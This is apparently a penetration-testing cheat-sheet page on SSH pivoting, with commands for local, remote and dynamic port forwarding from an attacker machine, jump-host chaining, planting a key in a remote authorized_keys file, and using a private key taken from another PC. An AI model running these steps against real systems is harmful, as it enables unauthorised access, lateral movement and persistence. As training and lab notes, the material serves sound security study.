---
title: SSH
parent: Pivot
layout: default
nav_order: 4
---

## Local Port Forward
On attacker PC, use\
`ssh -N -L 0.0.0.0:PORT:OTHERINTERNALSERVERIP:PORT user@remoteserver`\
For example can use to connect to SMB port 445 on 192.168.1.110 from SSH to 10.11.0.128\
`sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128`

## Remote Port Forward
On remote PC, to connect to local(attacker Kali) use\
`ssh -N -R KALIIP:KALIPORT:INTERNALSERVICEIP:PORT kaliuser@kaliIP`

## Dynamic Port Forward
 On attacker PC, use `ssh -D localport user@remoteserver`\
 Can connect to it using Burp or use proxychains4.conf (SOCKS5)

## Jump Host
Use to connect from host1 to host2 and to host3 and so on\
`ssh -J username@host1:port,username@host2:port username@host3:port`


## Proper shell connection. 
On own Kali:\
`ssh-keygen`. Then use\
`cat ~/.ssh/id_rsa.pub`\
Copy this info into the remote PC's `~/.ssh/authorized_keys`.

If you have obtained the id_rsa from another PC and are in Windows, use\
`icacls .\id_rsa /inheritance:r`\
then\
`icacls .\id_rsa /grant:r %username%":"(R)"`